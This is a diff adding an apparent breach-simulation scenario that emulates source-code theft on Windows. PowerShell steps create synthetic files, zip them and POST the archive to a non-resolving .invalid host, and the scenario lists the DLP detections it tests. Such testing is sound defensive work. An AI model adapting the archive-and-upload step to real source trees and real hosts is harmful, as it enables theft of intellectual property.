@@ -1,0 +1,158 @@
+id: collection-source-code-exfil
+product_line: dlp
+name: Source Code Exfiltration Probe
+description: >
+  Telemetry-safe emulation of an adversary taking a source-code tree off the
+  endpoint, either as an archive or as a push to a code-hosting service. The tree
+  is five synthetic [BAS-SIM] source files generated at run time. The scenario
+  checks whether DLP and egress controls protect intellectual property. Destinations
+  are .invalid hosts, so no code leaves the host.
+
+  KILL CHAIN STAGES:
+    1. Source Tree Creation — write a synthetic source tree with [BAS-SIM] files (T1005)
+    2. Source Archive       — zip the tree (T1560.001)
+    3. Repository Push      — POST the archive to a code-hosting-shaped .invalid host (T1567.001)
+
+  SAFETY: The source files are synthetic and tagged [BAS-SIM]. No repository,
+  credential, or real source tree is accessed. Destinations are .invalid and cannot
+  resolve. Files are deleted in cleanup. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - source-code
+  - intellectual-property
+  - exfiltration
+  - dlp
+  - t1005
+  - t1560
+  - t1567
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Source Tree Creation (T1005)
+  # ---------------------------------------------------------------------------
+  - name: "Source Exfil 1 — Synthetic Source Tree Creation (T1005)"
+    technique_id: T1005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes five small synthetic source files (.py, .go, .cs, .js, .ps1) with [BAS-SIM] header comments under %TEMP%\\bas_src_<runid>. No repository or real source is read."
+    telemetry:
+      - "Sysmon EID 11: source-shaped files created under %TEMP%\\bas_src_<runid>"
+    detection:
+      - "DLP: a source-code tree assembled outside a developer workspace"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_src_$runId"
+      $tree = Join-Path $work 'repo'
+      New-Item -ItemType Directory -Path $tree -Force | Out-Null
+      $files = @{
+        'main.py'    = "# [BAS-SIM] synthetic source file - not real code`r`nprint('bas-sim')"
+        'server.go'  = "// [BAS-SIM] synthetic source file - not real code`r`npackage main"
+        'Service.cs' = "// [BAS-SIM] synthetic source file - not real code`r`nclass BasSim {}"
+        'app.js'     = "// [BAS-SIM] synthetic source file - not real code`r`nconsole.log('bas-sim');"
+        'deploy.ps1' = "# [BAS-SIM] synthetic source file - not real code`r`nWrite-Output 'bas-sim'"
+      }
+      foreach ($k in $files.Keys) { Set-Content -Path (Join-Path $tree $k) -Value $files[$k] -Encoding UTF8 }
+      $count = @(Get-ChildItem -Path $tree -File).Count
+      Write-Output "EXEC T1005: created a synthetic source tree of $count file(s) at $tree. No real source was read. Source Stage 1. [BAS-SIM-SRC-S1]"
+      Write-Output "FAIL: A source-code tree was assembled outside a developer workspace with no DLP alert. Source assembly before transfer is a core intellectual-property signal."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Source Archive (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "Source Exfil 2 — Archive of the Source Tree (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Zips the synthetic source tree from Stage 1 into repo.zip in the same per-run folder. Nothing leaves the host in this stage."
+    telemetry:
+      - "Sysmon EID 1: powershell.exe with Compress-Archive"
+      - "Sysmon EID 11: repo.zip created"
+    detection:
+      - "EDR/DLP: archive of a source tree created outside a build or version-control process"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_src_$runId"
+      $tree = Join-Path $work 'repo'
+      if (-not (Test-Path $tree)) {
+        Write-Output "SKIP: T1560.001: no source tree from Stage 1 to archive. [BAS-SIM-SRC-S2]"
+        exit 0
+      }
+      $zip = Join-Path $work 'repo.zip'
+      Compress-Archive -Path (Join-Path $tree '*') -DestinationPath $zip -Force
+      $size = (Get-Item $zip).Length
+      Write-Output "EXEC T1560.001: archived the synthetic source tree to $zip ($size bytes). Source Stage 2. [BAS-SIM-SRC-S2]"
+      Write-Output "FAIL: A source-code archive was created with no alert."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Repository Push Attempt (T1567.001)
+  # ---------------------------------------------------------------------------
+  - name: "Source Exfil 3 — Code-Hosting Push Attempt to .invalid (T1567.001)"
+    technique_id: T1567.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs the synthetic source archive to a code-hosting-shaped RFC-6761 .invalid host over HTTP. The host cannot resolve, so no code leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid code-host name"
+      - "Proxy/egress log: POST of a source archive to an unsanctioned code host"
+    detection:
+      - "CASB/DLP: source archive pushed to an unsanctioned code-hosting service — exfil block expected"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $zip = Join-Path $env:TEMP "bas_src_$runId\repo.zip"
+      if (-not (Test-Path $zip)) {
+        Write-Output "SKIP: T1567.001: no source archive from Stage 2 to push. [BAS-SIM-SRC-S3]"
+        exit 0
+      }
+      $target = "http://bas-sim-code-$runId.invalid/api/push"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $zip -ContentType 'application/zip' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1567.001: attempted HTTP POST of the synthetic source archive to $target. reached=$reached (expected: false). Repository push Stage 3. [BAS-SIM-SRC-S3]"
+      if ($reached) {
+        Write-Output "FAIL: A source archive was pushed to an unsanctioned code host. Egress and CASB controls are not blocking intellectual property leaving the network."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to push a source archive to an unsanctioned code host. Unreachable only because the domain is .invalid; the attempt is the signal CASB and DLP should block."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_src_*') -Recurse -Force -ErrorAction SilentlyContinue
